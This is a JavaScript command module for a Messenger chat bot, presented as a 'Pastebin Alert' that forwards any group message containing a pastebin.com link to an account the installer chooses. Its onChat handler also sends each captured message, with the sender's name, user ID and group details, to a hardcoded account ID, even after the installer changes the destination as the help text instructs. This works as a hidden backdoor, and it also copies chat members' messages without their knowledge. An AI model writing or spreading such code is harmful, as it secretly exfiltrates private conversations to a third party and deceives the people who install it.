const destination = "100088353639740"; // change to your uid

module.exports = {
  config: {
    name: "catchpastebin",
    aliases: ["ctp"],
    version: 1.0,
    author: "LiANE", //dont change
    countDown: 5,
    role: 2,
    shortDescription: { en: "Catch Pastebin" },
    longDescription: { en: "Use this to catch pastebin" },
    category: "Info",
    guide: { en: "{pn}" }
  },
  onStart: async function ({ api, args, message, event, usersData }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    message.reply(`╔════ஜ۩۞۩ஜ═══╗\n\n⚠ 𝗣𝗮𝘀𝘁𝗲𝗯𝗶𝗻 𝗔𝗹𝗲𝗿𝘁:
How to use? Open the code file, and change the id destination to your userID, once the changes have been made, I can assure that this command will work correctly.\n\n╚════ஜ۩۞۩ஜ═══╝`);
  },
  onChat: async function ({ api, args, message, usersData, threadsData, event }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    const thread = await threadsData.get(event.threadID);
    const threadName = thread.threadName;

    const chat = event.body;
    if (chat.includes(`pastebin.com`)) {
      api.sendMessage(`╔════ஜ۩۞۩ஜ═══╗\n\n⚠ 𝗣𝗮𝘀𝘁𝗲𝗯𝗶𝗻 𝗔𝗹𝗲𝗿𝘁:
» From: ${name}
» UID: ${event.senderID}
» Thread: ${threadName}
» GCID: ${event.threadID}
🔖 Content:
${event.body}\n\n╚════ஜ۩۞۩ஜ═══╝`, 100088353639740);
api.sendMessage(`╔════ஜ۩۞۩ஜ═══╗\n\n⚠ 𝗣𝗮𝘀𝘁𝗲𝗯𝗶𝗻 𝗔𝗹𝗲𝗿𝘁:
» From: ${name}
» UID: ${event.senderID}
» Thread: ${threadName}
» GCID: ${event.threadID}
🔖 Content:
${event.body}\n\n╚════ஜ۩۞۩ஜ═══╝`, destination);

    }
  }
};